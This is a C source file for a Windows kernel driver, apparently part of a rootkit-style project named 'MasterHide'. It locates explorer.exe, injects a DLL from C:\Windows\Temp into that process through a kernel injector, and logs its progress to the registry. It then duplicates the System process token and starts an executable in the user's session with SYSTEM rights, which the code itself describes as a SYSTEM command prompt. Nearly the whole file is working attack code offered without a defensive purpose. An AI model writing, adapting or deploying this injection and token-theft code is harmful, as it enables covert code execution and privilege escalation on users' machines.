#include "Phase2Bridge.h"
#include "..\..\windows-kernel-dll-injector\DLLInjector\DLLInjector\Injector.h"

// ---------------------------------------------------------------------------
// Missing constants (from winnt.h / wdm.h)
// ---------------------------------------------------------------------------
#define PROCESS_QUERY_INFORMATION   (0x0400)
#define TOKEN_DUPLICATE             (0x0002)
#define TOKEN_QUERY                 (0x0008)
#define TOKEN_ADJUST_SESSIONID      (0x0100)
#define TOKEN_ALL_ACCESS            (0x000F01FF)

#define NORMAL_PRIORITY_CLASS       (0x00000020)
#define CREATE_NEW_CONSOLE          (0x00000010)
#define CREATE_UNICODE_ENVIRONMENT  (0x00000400)

// ---------------------------------------------------------------------------
// Missing types (only defined if not already present)
// ---------------------------------------------------------------------------
#ifndef TOKEN_TYPE_DEFINED
#define TOKEN_TYPE_DEFINED
typedef enum _TOKEN_TYPE {
    TokenPrimary = 1,
    TokenImpersonation
} TOKEN_TYPE;
#endif

#ifndef TOKEN_INFORMATION_CLASS_DEFINED
#define TOKEN_INFORMATION_CLASS_DEFINED
typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser = 1,
    TokenGroups,
    TokenPrivileges,
    TokenOwner,
    TokenPrimaryGroup,
    TokenDefaultDacl,
    TokenSource,
    TokenType,
    TokenImpersonationLevel,
    TokenStatistics,
    TokenRestrictedSids,
    TokenSessionId,
} TOKEN_INFORMATION_CLASS;
#endif

// Use a custom structure to avoid redefinition with system headers
typedef struct _MY_PROCESS_SESSION_INFORMATION {
    ULONG SessionId;
} MY_PROCESS_SESSION_INFORMATION;

// ---------------------------------------------------------------------------
// Missing function prototypes
// ---------------------------------------------------------------------------
NTSYSAPI NTSTATUS NTAPI PsLookupProcessByProcessId(
    _In_ HANDLE ProcessId,
    _Out_ PEPROCESS *Process
);

NTSYSAPI NTSTATUS NTAPI ObOpenObjectByPointer(
    _In_ PVOID Object,
    _In_ ULONG HandleAttributes,
    _In_opt_ PACCESS_STATE PassedAccessState,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Out_ PHANDLE Handle
);

NTKERNELAPI NTSTATUS NTAPI ZwQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
);

NTKERNELAPI NTSTATUS NTAPI ZwOpenProcessTokenEx(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle
);

NTKERNELAPI NTSTATUS NTAPI ZwDuplicateToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN EffectiveOnly,
    _In_ TOKEN_TYPE TokenType,
    _Out_ PHANDLE NewTokenHandle
);

NTKERNELAPI NTSTATUS NTAPI ZwSetInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _In_reads_bytes_(TokenInformationLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength
);

// ---------------------------------------------------------------------------
// Original definitions
// ---------------------------------------------------------------------------
#define SystemProcessInformation 5
#define PHASE2_POOL_TAG 'B2HP'
#include <ntstrsafe.h>

extern volatile LONG g_Phase2ExplorerLoaderReady;
extern volatile LONG g_Phase2ExplorerInjectionIssued;
extern HANDLE g_Phase2TargetExplorerPid;

NTSTATUS WriteCheckpoint(_In_ const char* Stage)
{
    UNICODE_STRING keyPath;
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MasterHide");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &keyPath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = ZwOpenKey(&hKey, KEY_SET_VALUE, &objAttr);
    if (!NT_SUCCESS(status))
        return status;

    UNICODE_STRING valueName;
    RtlInitUnicodeString(&valueName, L"InjectionStatus");

    ANSI_STRING ansiStr;
    RtlInitAnsiString(&ansiStr, Stage);

    WCHAR buf[128];
    UNICODE_STRING uniStr;
    uniStr.Buffer = buf;
    uniStr.MaximumLength = sizeof(buf);
    uniStr.Length = 0;

    for (ULONG i = 0; i < ansiStr.Length && (i * sizeof(WCHAR) < sizeof(buf) - sizeof(WCHAR)); i++)
    {
        uniStr.Buffer[i] = (WCHAR)ansiStr.Buffer[i];
        uniStr.Length += sizeof(WCHAR);
    }
    uniStr.Buffer[uniStr.Length / sizeof(WCHAR)] = L'\0';

    status = ZwSetValueKey(hKey, &valueName, 0, REG_SZ,
                           uniStr.Buffer, uniStr.Length + sizeof(WCHAR));
    ZwClose(hKey);
    return status;
}

static NTSTATUS WriteCheckpointWithStatus(_In_ const char* Stage, _In_ NTSTATUS Status)
{
    CHAR buffer[128];
    NTSTATUS formatStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s 0x%08X", Stage, Status);
    if (!NT_SUCCESS(formatStatus)) {
        return WriteCheckpoint(Stage);
    }
    return WriteCheckpoint(buffer);
}

typedef struct _PHASE2_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG Reserved1;
    LARGE_INTEGER CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE ProcessId;
    HANDLE ParentProcessId;
    ULONG HandleCount;
    ULONG SessionId;
} PHASE2_SYSTEM_PROCESS_INFORMATION, *PPHASE2_SYSTEM_PROCESS_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid);
static NTSTATUS WaitForExplorerLoaderReady(void);

// ---------------------------------------------------------------------------
// Kernel‑side SYSTEM spawner for jtl.exe
// ---------------------------------------------------------------------------
NTSTATUS Phase2_SpawnSystemJtl(void)
{
    NTSTATUS status;
    PEPROCESS pExplorer = NULL;
    HANDLE hExplorer = NULL;
    MY_PROCESS_SESSION_INFORMATION sessionInfo = { 0 };
    ULONG sessionId = 0;
    HANDLE hSystemToken = NULL;
    HANDLE hDupToken = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    if (g_Phase2TargetExplorerPid == NULL) {
        WriteCheckpoint("SpawnJtl: no explorer PID");
        return STATUS_NOT_FOUND;
    }

    // 1. Get Explorer's session ID
    status = PsLookupProcessByProcessId(g_Phase2TargetExplorerPid, &pExplorer);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: PsLookup failed", status);
        return status;
    }

    status = ObOpenObjectByPointer(pExplorer,
                                   OBJ_KERNEL_HANDLE,
                                   NULL,
                                   PROCESS_QUERY_INFORMATION,
                                   *PsProcessType,
                                   KernelMode,
                                   &hExplorer);
    ObDereferenceObject(pExplorer);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: ObOpenObjectByPointer failed", status);
        return status;
    }

    status = ZwQueryInformationProcess(hExplorer,
                                       ProcessSessionInformation,
                                       &sessionInfo,
                                       sizeof(sessionInfo),
                                       NULL);
    ZwClose(hExplorer);
    if (!NT_SUCCESS(status) || sessionInfo.SessionId == 0) {
        WriteCheckpointWithStatus("SpawnJtl: invalid session", status);
        return STATUS_UNSUCCESSFUL;
    }
    sessionId = sessionInfo.SessionId;

    // 2. Get a SYSTEM token from the System process (PID 4)
    PEPROCESS pSystem = NULL;
    status = PsLookupProcessByProcessId(ULongToHandle(4), &pSystem);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: PsLookup(4) failed", status);
        return status;
    }

    status = ZwOpenProcessTokenEx(pSystem,
                                  TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_SESSIONID,
                                  OBJ_KERNEL_HANDLE,
                                  &hSystemToken);
    ObDereferenceObject(pSystem);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: ZwOpenProcessTokenEx failed", status);
        return status;
    }

    // 3. Duplicate the token as a primary token
    OBJECT_ATTRIBUTES oa = RTL_CONSTANT_OBJECT_ATTRIBUTES(NULL, OBJ_KERNEL_HANDLE);
    status = ZwDuplicateToken(hSystemToken,
                              TOKEN_ALL_ACCESS,
                              &oa,
                              FALSE,
                              TokenPrimary,
                              &hDupToken);
    ZwClose(hSystemToken);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: ZwDuplicateToken failed", status);
        return status;
    }

    // 4. Assign the token to Explorer's session
    status = ZwSetInformationToken(hDupToken,
                                   TokenSessionId,
                                   &sessionId,
                                   sizeof(sessionId));
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: SetTokenSessionId failed", status);
        ZwClose(hDupToken);
        return status;
    }

    // 5. Resolve ZwCreateUserProcess dynamically (not exported by name)
    UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"ZwCreateUserProcess");
    PVOID pZwCreateUserProcess = MmGetSystemRoutineAddress(&routineName);
    if (pZwCreateUserProcess == NULL) {
        WriteCheckpoint("SpawnJtl: ZwCreateUserProcess not found");
        ZwClose(hDupToken);
        return STATUS_NOT_FOUND;
    }

    // Correct prototype
    typedef NTSTATUS (NTAPI *PFN_ZwCreateUserProcess)(
        OUT PHANDLE ProcessHandle,
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK ProcessDesiredAccess,
        IN ACCESS_MASK ThreadDesiredAccess,
        IN POBJECT_ATTRIBUTES ProcessObjectAttributes,
        IN POBJECT_ATTRIBUTES ThreadObjectAttributes,
        IN ULONG ProcessFlags,
        IN ULONG ThreadFlags,
        IN PVOID Environment,
        IN PUNICODE_STRING ImageName,
        IN PVOID ProcessInfo,
        IN ULONG ProcessInfoLength,
        IN PVOID AttributeList,
        IN ULONG AttributeListSize,
        IN HANDLE Token,
        IN PVOID DebugPort,
        IN PVOID ConsoleHostProcess,
        IN PVOID Reserved
    );
    PFN_ZwCreateUserProcess pfn = (PFN_ZwCreateUserProcess)pZwCreateUserProcess;

    // 6. Create jtl.exe with the SYSTEM token
    UNICODE_STRING imagePath;
    RtlInitUnicodeString(&imagePath, L"\\SystemRoot\\System32\\jtl.exe");

    OBJECT_ATTRIBUTES procObjAttr;
    InitializeObjectAttributes(&procObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = pfn(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        &procObjAttr,          // process attributes
        &procObjAttr,          // thread attributes
        NORMAL_PRIORITY_CLASS,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        NULL,                  // environment
        &imagePath,
        NULL, 0,               // ProcessInfo
        NULL, 0,               // AttributeList
        hDupToken,             // SYSTEM token
        NULL,                  // DebugPort
        NULL,                  // ConsoleHostProcess
        NULL                   // Reserved
    );

    ZwClose(hDupToken);
    if (hProcess) ZwClose(hProcess);
    if (hThread) ZwClose(hThread);

    if (NT_SUCCESS(status)) {
        WriteCheckpoint("SpawnJtl: jtl.exe started as SYSTEM");
    } else {
        WriteCheckpointWithStatus("SpawnJtl: ZwCreateUserProcess failed", status);
    }
    return status;
}

// ---------------------------------------------------------------------------
// Phase2 injection logic
// ---------------------------------------------------------------------------
NTSTATUS Phase2_TriggerInjection()
{
    WriteCheckpoint("Phase2 entered (startup)");

    HANDLE targetPid = NULL;
    NTSTATUS status = FindTargetProcessId(&targetPid);
    if (!NT_SUCCESS(status))
    {
        WriteCheckpointWithStatus("FindTargetProcessId failed", status);
        return status;
    }

    g_Phase2TargetExplorerPid = targetPid;

    return Phase2_TriggerInjectionForPid(targetPid, FALSE);
}

NTSTATUS Phase2_TriggerInjectionForPid(HANDLE Pid, BOOLEAN WaitForLoader)
{
    WriteCheckpoint("Phase2 entered (pid)");

    if (Pid == NULL)
    {
        WriteCheckpoint("Invalid pid");
        return STATUS_INVALID_PARAMETER;
    }

    if (WaitForLoader)
    {
        NTSTATUS waitStatus = WaitForExplorerLoaderReady();
        if (!NT_SUCCESS(waitStatus) && waitStatus != STATUS_TIMEOUT)
        {
            WriteCheckpointWithStatus("Explorer loader wait failed", waitStatus);
            return waitStatus;
        }

        if (!g_Phase2ExplorerLoaderReady)
        {
            WriteCheckpoint("Explorer loader not ready");
            return STATUS_PENDING;
        }
    }
    else
    {
        InterlockedExchange(&g_Phase2ExplorerLoaderReady, 1);
    }

    if (InterlockedCompareExchange(&g_Phase2ExplorerInjectionIssued, 1, 0) != 0)
    {
        WriteCheckpoint("Injection already issued");
        return STATUS_ALREADY_COMMITTED;
    }

    UNICODE_STRING dllPath = RTL_CONSTANT_STRING(L"C:\\Windows\\Temp\\inject.dll");
    NTSTATUS status = InjectDllIntoProcess(Pid, &dllPath);

    if (!NT_SUCCESS(status))
    {
        InterlockedExchange(&g_Phase2ExplorerInjectionIssued, 0);
        return status;
    }

    WriteCheckpoint("Injection confirmed");

    // Spawn the SYSTEM command prompt right after injection
    Phase2_SpawnSystemJtl();

    return status;
}

static NTSTATUS WaitForExplorerLoaderReady(void)
{
    LARGE_INTEGER interval;
    interval.QuadPart = -50 * 10000;

    for (ULONG attempt = 0; attempt < 20; ++attempt)
    {
        if (g_Phase2ExplorerLoaderReady)
        {
            return STATUS_SUCCESS;
        }

        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    return STATUS_TIMEOUT;
}

static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid)
{
    PVOID processBuffer = NULL;
    SIZE_T processBufferSize = 0x10000;
    UNICODE_STRING targetName = RTL_CONSTANT_STRING(L"explorer.exe");
    NTSTATUS status;

    if (Pid == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    *Pid = NULL;

    for (;;) {
        processBuffer = ExAllocatePool2(POOL_FLAG_PAGED, processBufferSize, PHASE2_POOL_TAG);
        if (processBuffer == NULL) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        status = ZwQuerySystemInformation(
            SystemProcessInformation,
            processBuffer,
            (ULONG)processBufferSize,
            NULL
        );

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePool(processBuffer);
            processBuffer = NULL;
            processBufferSize += 0x10000;
            continue;
        }

        break;
    }

    if (NT_SUCCESS(status)) {
        PPHASE2_SYSTEM_PROCESS_INFORMATION process =
            (PPHASE2_SYSTEM_PROCESS_INFORMATION)processBuffer;

        for (;;) {
            if (process->ImageName.Buffer != NULL &&
                process->SessionId != 0)
            {
                USHORT nameStart = process->ImageName.Length / sizeof(WCHAR);
                while (nameStart > 0) {
                    const WCHAR ch = process->ImageName.Buffer[nameStart - 1];
                    if (ch == L'\\' || ch == L'/') break;
                    --nameStart;
                }

                UNICODE_STRING baseName;
                baseName.Buffer = process->ImageName.Buffer + nameStart;
                baseName.Length = process->ImageName.Length - (nameStart * sizeof(WCHAR));
                baseName.MaximumLength = baseName.Length;

                if (RtlEqualUnicodeString(&baseName, &targetName, TRUE)) {
                    *Pid = process->ProcessId;
                    status = STATUS_SUCCESS;
                    break;
                }
            }

            if (process->NextEntryOffset == 0) {
                status = STATUS_NOT_FOUND;
                break;
            }

            process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)
                ((PUCHAR)process + process->NextEntryOffset);
        }
    }

    if (processBuffer != NULL) {
        ExFreePool(processBuffer);
    }

    return status;
}